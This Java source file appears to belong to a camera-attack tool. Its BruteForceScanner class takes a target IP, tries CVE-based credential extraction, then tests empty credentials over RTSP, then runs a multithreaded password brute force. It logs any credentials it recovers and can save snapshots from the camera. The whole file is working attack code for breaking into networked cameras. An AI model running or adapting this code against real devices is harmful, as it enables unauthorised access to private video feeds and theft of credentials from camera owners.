package scanner.brute;

import lombok.Getter;
import lombok.SneakyThrows;
import lombok.extern.slf4j.Slf4j;
import scanner.ExecutorHolder;
import scanner.Preferences;
import scanner.cve.CVEScanner;
import scanner.ffmpeg.FFmpegExecutor;
import scanner.onvif.OnvifScreenSaver;
import scanner.rtsp.RTSPContext;
import scanner.rtsp.TransportMode;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.Objects;
import java.util.Optional;
import java.util.concurrent.CompletableFuture;
import java.util.stream.Collectors;

import static scanner.Preferences.ALLOW_FRAME_SAVING;
import static scanner.Preferences.ALLOW_UNTRUSTED_HOST;

/**
 * Brute force attack basic class.
 *
 * @author inkarnadin
 */
@Slf4j
public class BruteForceScanner {

    private final static long TERMINATION_TIMEOUT = 1000L;

    private final static String BRUTE_CONST_NAME = "<brute>";
    private final static String REPEAT_CONST_NAME = "<repeat>";
    private final static String CVE_CONST_NAME = "<cve>";
    private final static String EMPTY_CONST_NAME = "<empty>";

    @Getter
    private final PostCheckCVEContainer checkCVEContainer = new PostCheckCVEContainer();

    /**
     * Start brute certain address by prepared range passwords list.
     *
     * @param ip target IP address.
     * @param passwords passwords array.
     */
    @SneakyThrows
    public void brute(String ip, String[] passwords) {
        Optional<String> cveResult = isRepeat()
                ? Optional.empty()
                : CVEScanner.scanning(ip);
        if (cveResult.isPresent()) {
            String credentials = cveResult.get();
            writeLog(ip, Collections.singletonList(credentials), CVE_CONST_NAME);

            checkCVEContainer.addCredentials(credentials);
            checkCVEContainer.excludeAddress(ip);

            if (Preferences.check(ALLOW_FRAME_SAVING)) {
                boolean isSuccess = OnvifScreenSaver.saveSnapshot(ip);
                if (!isSuccess)
                    FFmpegExecutor.saveFrame(credentials, ip);
            }
            return;
        }

        if (isEmptyBruteTask(ip))
            return;

        int threads = ExecutorHolder.COUNT_THREADS;
        int threshold = (threads - (passwords.length % threads) + passwords.length) / threads;
        List<CompletableFuture<AuthContainer>> futures = new ArrayList<>();
        for (int j = 0; j < passwords.length; j += threshold)
            futures.add(createBruteTask(ip, Arrays.copyOfRange(passwords, j, Math.min(j + threshold, passwords.length))));

        List<String> results = futures.stream()
                .map(CompletableFuture::join)
                .filter(i -> i.getIp().equals(ip))
                .flatMap(x -> x.getOnlyAuth().stream())
                .peek(checkCVEContainer::excludeAddress)
                .collect(Collectors.toList());

        if (results.size() > 0)
            writeLog(ip, results, isRepeat() ? REPEAT_CONST_NAME : BRUTE_CONST_NAME);

        ExecutorHolder.await(TERMINATION_TIMEOUT);
    }

    private boolean isRepeat() {
        return !checkCVEContainer.isEmpty();
    }

    private CompletableFuture<AuthContainer> createBruteTask(String ip, String[] passwords) {
        CompletableFuture<AuthContainer> future = new CompletableFuture<>();
        CompletableFuture.runAsync(() -> new BruteTask(future, ip, passwords).run(), ExecutorHolder.EXECUTOR_SERVICE);
        return future;
    }

    private boolean isEmptyBruteTask(String ip) {
        if (isRepeat())
            return false;

        RTSPContext.set(ip, TransportMode.ORTHODOX);
        CompletableFuture<AuthContainer> bruteTask = createBruteTask(ip, new String[] { null });
        AuthContainer result = bruteTask.join();

        // if true - skip further brute with credentials
        switch (result.getEmptyCredentialsAuth()) {
            case AUTH:
                checkCVEContainer.excludeAddress(ip);
                writeLog(ip, new ArrayList<>(), EMPTY_CONST_NAME);
                return true;
            case NOT_AVAILABLE:
                return !Preferences.check(ALLOW_UNTRUSTED_HOST);
            case UNKNOWN_STATE:
                return true;
            default:
                return false;
        }
    }

    private void writeLog(String ip, List<String> results, String name) {
        String credentials = results.size() == 1 ? results.get(0) : ":";
        String path = "11";
        String localName = (Objects.isNull(name)) ? EMPTY_CONST_NAME : name;

        log.info("{}:{}:{}:{}", ip, path, credentials, localName);
    }

}